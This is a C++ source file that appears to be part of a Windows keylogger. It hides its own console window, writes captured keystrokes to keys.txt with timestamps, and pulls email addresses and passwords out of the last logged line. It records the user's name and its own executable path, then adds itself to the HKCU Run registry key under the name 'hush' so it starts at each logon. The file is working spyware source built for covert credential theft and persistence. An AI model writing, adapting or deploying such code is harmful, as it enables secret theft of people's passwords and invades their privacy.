#include "header.h"

using namespace std;

const string F_NAME = "keys.txt";

//ofstream outFile(F_NAME, ios::out);



void hyde() {
    HWND stealth; /*creating stealth (window is not visible)*/
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}

void ts(ofstream& outFile) {

    time_t t = time(nullptr);
    outFile << put_time(std::localtime(&t), "%c %Z") << endl << endl;
}

void PE(ofstream& outFile) {

    string lastLog = seekLastLine();
    string com = ".com";
    string space = " ";
    string temp = "";
    string email = "";
    string pw = "";




    size_t found = lastLog.find(com);
    if (found!=std::string::npos) {
        temp = lastLog.substr(0, found +  4);
    }

    size_t foundSpace = temp.find_last_of(" ");
    if (foundSpace!=std::string::npos) {

        email = temp.substr(foundSpace + 1, found + 4);
    }else {
        email = temp;
    }

    pw = lastLog.substr(found + 4, lastLog.find('\n'));

    outFile << "\n\nEMAIL: " << email << endl;
    outFile << "PASSW: " << pw << endl;




}

string seekLastLine() {


    string line;
    string last_line;

    ifstream myfile(F_NAME);

    if(myfile.is_open())
    {
        while( getline(myfile, line) ) {
            bool is_empty = true;
            for (int i = 0; i < line.size(); i++) {
                char ch = line[i];
                is_empty = is_empty && isspace(ch);
            }
            if (!is_empty) {

                last_line = line;
            }
        }
        myfile.close();
        return last_line;
    }
    else {
        cout << "Unable to open file";

        return "";
    }


}

void startUp(std::ofstream& outFile) {

    //gets users name name
    char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserName(username, &username_len);

    //Get filepath of running exe
    string filePath = getFilePath();

    outFile << "User: " << username << endl;
    outFile << "File path: " << filePath << endl << endl;



    HKEY hKey;
    const char* czStartName = "hush";
    const char* czExePath   = filePath.c_str();

    LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0 , KEY_WRITE,
                                &hKey);
    if( ERROR_SUCCESS == lnRes )
    {
        lnRes = RegSetValueEx(  hKey,
                                czStartName,
                                0,
                                REG_SZ,
                                (unsigned char*)czExePath,
                                strlen(czExePath) );
    }

    RegCloseKey(hKey);
}


string getFilePath(){

    char ownPth[MAX_PATH];

    // When NULL is passed to GetModuleHandle, the handle of the exe itself is returned
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule != NULL)
    {
        // Use GetModuleFileName() with module handle to get the path
        GetModuleFileName(hModule, ownPth, (sizeof(ownPth)));

        return ownPth;
    }
    else
    {
        cout << "Module handle is NULL" << endl ;
        return "path is null";
    }

}